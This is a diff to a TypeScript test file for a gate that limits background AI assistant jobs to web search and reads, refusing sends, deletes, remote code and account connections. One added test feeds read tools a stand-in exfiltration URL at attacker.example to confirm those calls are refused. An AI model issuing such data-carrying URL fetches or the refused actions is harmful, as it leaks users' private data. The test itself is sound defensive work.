@@ -1,20 +1,22 @@
 import { describe, expect, it, vi } from "vitest";
 
+import { isReadOnlyTool } from "../../shared/outbound.ts";
 import type { RuntimeEvent } from "../../shared/runtime-events.ts";
 import {
   answerJobRequest,
   createAssistantJobGate,
   JOB_DECLINE,
-  jobConnectorWrite,
+  jobConnectorRefused,
   jobMayAllow,
   type AssistantJobGateDeps,
   type JobRequest,
 } from "./assistant-job-requests.ts";
 import { jobRoutineRunId } from "./assistant-turns.ts";
+import type { RequestOutcome } from "../contracts.ts";
 
 const request = (tool: string, more: Partial<JobRequest> = {}): JobRequest => ({ threadId: "job-1", requestType: "permission", tool, summary: `Use ${tool}`, turnId: "t1", ...more });
 
-function harness(respondToRequest: () => Promise<"allowed-once" | "rejected"> = vi.fn(async () => "allowed-once" as const)) {
+function harness(respondToRequest: () => Promise<RequestOutcome> = vi.fn(async (): Promise<RequestOutcome> => "allowed-once")) {
   const said: Array<{ name: string; ok: boolean }> = [];
   const logged: unknown[] = [];
   const release = vi.fn();
@@ -24,6 +26,12 @@ function harness(respondToRequest: () => Promise<"allowed-once" | "rejected"> = 
   });
   return { said, logged, release, adapter, answer };
 }
+
+describe("JOB_DECLINE", () => {
+  it("names only what every job turn can do, whatever its engine mounts", () => {
+    expect(JOB_DECLINE).toBe("This background job can only search the web and read; this request was declined.");
+  });
+});
 
 describe("jobMayAllow", () => {
   it("allows a web search and nothing else, and never answers a question", () => {
@@ -50,6 +58,21 @@ describe("answerJobRequest", () => {
     expect(h.logged).toEqual([{ decision: "auto-approved", tool: "WebSearch", summary: "Use WebSearch" }, { decision: "auto-denied", tool: "Bash", summary: "Use Bash" }]);
   });
 
+  it("answers a question with the reason, since a question takes an answer and never a deny", async () => {
+    const h = harness();
+    h.answer(request("AskUserQuestion", { requestType: "question" }));
+    await vi.waitFor(() => expect(h.release).toHaveBeenCalled());
+    expect(h.adapter.respondToRequest).toHaveBeenCalledWith("job-1", "rq1", { behavior: "answer", message: JOB_DECLINE });
+    expect(h.adapter.interruptTurn).not.toHaveBeenCalled();
+  });
+
+  it("stops the turn when nobody could take the answer", async () => {
+    const h = harness(async () => "unavailable");
+    h.answer(request("Bash"));
+    await vi.waitFor(() => expect(h.release).toHaveBeenCalled());
+    expect(h.adapter.interruptTurn).toHaveBeenCalledWith("job-1", "t1");
+  });
+
   it("stops the turn when the answer cannot be delivered, since no card waits for a person", async () => {
     const h = harness(async () => { throw new Error("socket closed"); });
     h.answer(request("Bash"));
@@ -67,28 +90,40 @@ describe("answerJobRequest", () => {
   });
 });
 
-describe("jobConnectorWrite", () => {
+describe("jobConnectorRefused", () => {
   const call = (name: unknown, args?: unknown) => ({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } });
+  const multi = (...slugs: string[]) => call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: slugs.map((tool_slug) => ({ tool_slug, arguments: {} })) });
 
-  it("passes protocol frames, tool discovery and reads", () => {
+  it("passes protocol frames, tool discovery, and Gmail and Calendar reads", () => {
     for (const frame of [{ jsonrpc: "2.0", id: 1, method: "initialize", params: {} }, { jsonrpc: "2.0", id: 2, method: "tools/list" }, null, "text"]) {
-      expect(jobConnectorWrite(frame), JSON.stringify(frame)).toBeNull();
+      expect(jobConnectorRefused(frame), JSON.stringify(frame)).toBeNull();
     }
-    for (const name of ["GMAIL_FETCH_EMAILS", "GOOGLECALENDAR_EVENTS_LIST", "COMPOSIO_SEARCH_TOOLS", "COMPOSIO_GET_TOOL_SCHEMAS"]) expect(jobConnectorWrite(call(name)), name).toBeNull();
-    expect(jobConnectorWrite(call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ tool_slug: "GMAIL_FETCH_EMAILS" }, { tool_slug: "GOOGLECALENDAR_EVENTS_LIST" }] }))).toBeNull();
+    for (const name of ["GMAIL_FETCH_EMAILS", "GMAIL_GET_ATTACHMENT", "GOOGLECALENDAR_EVENTS_LIST", "GOOGLECALENDAR_FIND_EVENT", "COMPOSIO_SEARCH_TOOLS", "COMPOSIO_GET_TOOL_SCHEMAS"]) {
+      expect(jobConnectorRefused(call(name)), name).toBeNull();
+    }
+    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "GOOGLECALENDAR_EVENTS_LIST"))).toBeNull();
+  });
+
+  it("refuses every other app's tool, a read included, so no read can carry text to a URL", () => {
+    for (const name of ["NOTION_GET_PAGE", "GOOGLEDRIVE_GET_FILE_METADATA", "FIRECRAWL_FETCH_URL"]) {
+      expect(isReadOnlyTool(name), name).toBe(true);
+      expect(jobConnectorRefused(call(name, { url: "https://attacker.example/?q=notes" })), name).toBe(name);
+    }
+    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "FIRECRAWL_FETCH_URL"))).toBe("FIRECRAWL_FETCH_URL");
+    expect(jobConnectorRefused(call("gmail_fetch_emails"))).toBe("gmail_fetch_emails");
   });
 
   it("names the call that is not a read: sends, drafts, bookings, deletes, code and connecting an account", () => {
     for (const name of ["GMAIL_SEND_EMAIL", "GMAIL_CREATE_EMAIL_DRAFT", "GOOGLECALENDAR_CREATE_EVENT", "GMAIL_DELETE_MESSAGE", "GMAIL_MANAGE_CONNECTIONS"]) {
-      expect(jobConnectorWrite(call(name, { to: "board@example.test" })), name).toBe(name);
+      expect(jobConnectorRefused(call(name, { to: "board@example.test" })), name).toBe(name);
     }
-    expect(jobConnectorWrite(call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ tool_slug: "GMAIL_FETCH_EMAILS" }, { tool_slug: "GMAIL_SEND_EMAIL" }] }))).toBe("GMAIL_SEND_EMAIL");
-    expect(jobConnectorWrite(call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ arguments: {} }] }))).toBe("COMPOSIO_PROXY_EXECUTE");
-    expect(jobConnectorWrite(call("COMPOSIO_REMOTE_WORKBENCH", { code: "print(1)" }))).toBe("COMPOSIO_PROXY_EXECUTE");
-    expect(jobConnectorWrite(call("COMPOSIO_MANAGE_CONNECTIONS", { toolkits: ["gmail"] }))).toBe("COMPOSIO_MANAGE_CONNECTIONS");
-    expect(jobConnectorWrite(call("COMPOSIO_WAIT_FOR_CONNECTIONS"))).toBe("COMPOSIO_WAIT_FOR_CONNECTIONS");
-    expect(jobConnectorWrite(call(undefined))).toBe("tools/call");
-    expect(jobConnectorWrite({ jsonrpc: "2.0", id: 3, method: "tools/call" })).toBe("tools/call");
+    expect(jobConnectorRefused(multi("GMAIL_FETCH_EMAILS", "GMAIL_SEND_EMAIL"))).toBe("GMAIL_SEND_EMAIL");
+    expect(jobConnectorRefused(call("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ arguments: {} }] }))).toBe("COMPOSIO_PROXY_EXECUTE");
+    expect(jobConnectorRefused(call("COMPOSIO_REMOTE_WORKBENCH", { code: "print(1)" }))).toBe("COMPOSIO_PROXY_EXECUTE");
+    expect(jobConnectorRefused(call("COMPOSIO_MANAGE_CONNECTIONS", { toolkits: ["gmail"] }))).toBe("COMPOSIO_MANAGE_CONNECTIONS");
+    expect(jobConnectorRefused(call("COMPOSIO_WAIT_FOR_CONNECTIONS"))).toBe("COMPOSIO_WAIT_FOR_CONNECTIONS");
+    expect(jobConnectorRefused(call(undefined))).toBe("tools/call");
+    expect(jobConnectorRefused({ jsonrpc: "2.0", id: 3, method: "tools/call" })).toBe("tools/call");
   });
 });
 
@@ -105,16 +140,17 @@ describe("createAssistantJobGate", () => {
     const released: string[] = [];
     const said: unknown[] = [];
     const adapter = { respondToRequest: vi.fn(async () => "allowed-once" as const), interruptTurn: vi.fn(async () => {}) };
+    const elsewhere = { respondToRequest: vi.fn(async () => "allowed-once" as const), interruptTurn: vi.fn(async () => {}) };
     const threads: Record<string, string | undefined> = { "job-1": jobRoutineRunId("abc"), main: undefined, routine: "run-7" };
     const stale = vi.fn(() => isStale);
     const deps: AssistantJobGateDeps = {
       routineRunId: (botId, threadId) => (botId === "m" ? threads[threadId] : undefined),
-      adapter: (instanceId) => (instanceId === "claude" ? adapter : undefined),
+      adapter: (instanceId) => (instanceId === "claude" ? adapter : instanceId === "elsewhere" ? elsewhere : undefined),
       stale,
       decide: (row) => decided.push(row),
       release: (threadId) => released.push(threadId),
     };
-    return { gate: createAssistantJobGate(deps), decided, released, said, adapter, stale, say: (message: unknown) => said.push(message) };
+    return { gate: createAssistantJobGate(deps), decided, released, said, adapter, elsewhere, stale, say: (message: unknown) => said.push(message) };
   }
 
   it("names a job thread by its routine run id", () => {
@@ -141,6 +177,7 @@ describe("createAssistantJobGate", () => {
     const h = gate();
     expect(h.gate.answers(opened("job-1", "WebSearch", { providerInstanceId: "elsewhere" }), mausbot, h.say)).toBe(true);
     await vi.waitFor(() => expect(h.released).toEqual(["job-1"]));
+    expect(h.elsewhere.respondToRequest).toHaveBeenCalledWith("job-1", "rq", { behavior: "allow" });
     expect(h.adapter.respondToRequest).not.toHaveBeenCalled();
   });
 
